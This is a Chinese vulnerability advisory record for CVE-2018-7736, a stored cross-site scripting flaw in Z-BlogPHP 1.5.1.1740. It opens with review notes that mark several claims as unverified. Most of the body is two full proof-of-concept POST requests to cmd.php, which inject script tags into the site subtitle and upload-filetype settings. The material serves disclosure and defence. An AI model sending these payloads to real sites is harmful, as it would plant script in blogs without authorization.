---
cve: "CVE-2018-7736"
source: "白阁文库 BaizeSec/bylibrary"
product: "Z-BlogPHP1.5.1.1740"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-7736"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "Z-Blog 1.5.1.1740存在XSS漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：settingsadminandvalidtoken; fieldsZC_BLOG_SUBNAME/ZC_UPLOAD_FILETYPE; outputcontextunknown"
side_effects: "未执行；本文需注意的操作影响：修改整站大量无关配置易有副作用，标准化需最小字段请求及说明"
source_status: "unknown"
id: "vw-0fdb440803203fe7a90c97c8"
entity_id: "ve-0fdb440803203fe7a90c97c8"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：settingsadminandvalidtoken; fieldsZC_BLOG_SUBNAME/ZC_UPLOAD_FILETYPE; outputcontextunknown

- **事实待核（1）**：应精确产品Z-BlogPHP非ASP分支，源码链接已指明。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **凭据与会话边界（2）**：只有token化POST数据无Cookie/最低角色/二次显示位置，不能辨自XSS/跨权限范围。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **来源与引用处置（3）**：修改整站大量无关配置易有副作用，标准化需最小字段请求及说明。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

- **事实待核（4）**：两个输入同CVE可一文保留，缺修复版本/响应/成因，有MITRE链接。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Z-Blog 1.5.1.1740存在XSS漏洞

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Z-Blog 1.5.1.1740存在XSS漏洞|2018-04-05|zzw (zzw@5ecurity.cn)|[https://www.zblogcn.com/](https://www.zblogcn.com/) | [https://github.com/zblogcn/zblogphp](https://github.com/zblogcn/zblogphp) |1.5.1.1740| [CVE-2018-7736](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7736)|  

#### 漏洞概述  

> Z-BlogPHP 1.5.1.1740版本的cmd.php页面ZC_BLOG_SUBNAME及ZC_UPLOAD_FILETYPE参数过滤不严格可导致跨站脚本漏洞。  

### POC实现代码如下：  

> ZC_BLOG_SUBNAME参数poc代码:

``` raw
post_url：http://localhost/z-blog/zb_system/cmd.php?act=SettingSav&token=2c7ca9a4c1c3d856e012595ca878564f
 
post_data:
 
ZC_BLOG_HOST=http%3A%2F%2Flocalhost%2Fz-blog%2F&ZC_PERMANENT_DOMAIN_ENABLE=&ZC_PERMANENT_DOMAIN_WITH_ADMIN=&ZC_BLOG_NAME=admin&ZC_BLOG_SUBNAME=Good%20Luck%20To%20You!tluf3%22%3e%3cscript%3ealert(1)%3c%2fscript%3euk095&ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&ZC_TIME_ZONE_NAME=Asia%2FShanghai&ZC_BLOG_LANGUAGEPACK=zh-cn&ZC_UPLOAD_FILETYPE=jpg%7Cgif%7Cpng%7Cjpeg%7Cbmp%7Cpsd%7Cwmf%7Cico%7Crpm%7Cdeb%7Ctar%7Cgz%7Csit%7C7z%7Cbz2%7Czip%7Crar%7Cxml%7Cxsl%7Csvg%7Csvgz%7Crtf%7Cdoc%7Cdocx%7Cppt%7Cpptx%7Cxls%7Cxlsx%7Cwps%7Cchm%7Ctxt%7Cpdf%7Cmp3%7Cmp4%7Cavi%7Cmpg%7Crm%7Cra%7Crmvb%7Cmov%7Cwmv%7Cwma%7Cswf%7Cfla%7Ctorrent%7Capk%7Czba%7Cgzba&ZC_UPLOAD_FILESIZE=2&ZC_DEBUG_MODE=&ZC_GZIP_ENABLE=&ZC_SYNTAXHIGHLIGHTER_ENABLE=1&ZC_CLOSE_SITE=&ZC_DISPLAY_COUNT=10&ZC_DISPLAY_SUBCATEGORYS=1&ZC_PAGEBAR_COUNT=10&ZC_SEARCH_COUNT=20&ZC_MANAGE_COUNT=50&ZC_COMMENT_TURNOFF=&ZC_COMMENT_AUDIT=&ZC_COMMENT_REVERSE_ORDER=&ZC_COMMENTS_DISPLAY_COUNT=100&ZC_COMMENT_VERIFY_ENABLE=

```
> ZC_UPLOAD_FILETYPE参数poc代码:  

```raw
post_data:
 
ZC_BLOG_HOST=http://localhost/z-blog/&ZC_PERMANENT_DOMAIN_ENABLE=&ZC_PERMANENT_DOMAIN_WITH_ADMIN=&ZC_BLOG_NAME=admin&ZC_BLOG_SUBNAME=Good+Luck+To+You!&ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&ZC_TIME_ZONE_NAME=Asia/Shanghai&ZC_BLOG_LANGUAGEPACK=zh-cn&ZC_UPLOAD_FILETYPE=jpg|gif|png|jpeg|bmp|psd|wmf|ico|rpm|deb|tar|gz|sit|7z|bz2|zip|rar|xml|xsl|svg|svgz|rtf|doc|docx|ppt|pptx|xls|xlsx|wps|chm|txt|pdf|mp3|mp4|avi|mpg|rm|ra|rmvb|mov|wmv|wma|swf|fla|torrent|apk|zba|gzbauckek"><script>alert(1)</script>ekkgh&ZC_UPLOAD_FILESIZE=2&ZC_DEBUG_MODE=&ZC_GZIP_ENABLE=&ZC_SYNTAXHIGHLIGHTER_ENABLE=1&ZC_CLOSE_SITE=&ZC_DISPLAY_COUNT=10&ZC_DISPLAY_SUBCATEGORYS=1&ZC_PAGEBAR_COUNT=10&ZC_SEARCH_COUNT=20&ZC_MANAGE_COUNT=50&ZC_COMMENT_TURNOFF=&ZC_COMMENT_AUDIT=&ZC_COMMENT_REVERSE_ORDER=&ZC_COMMENTS_DISPLAY_COUNT=100&ZC_COMMENT_VERIFY_ENABLE=
```


---

> 来源：白阁文库 BaizeSec/bylibrary
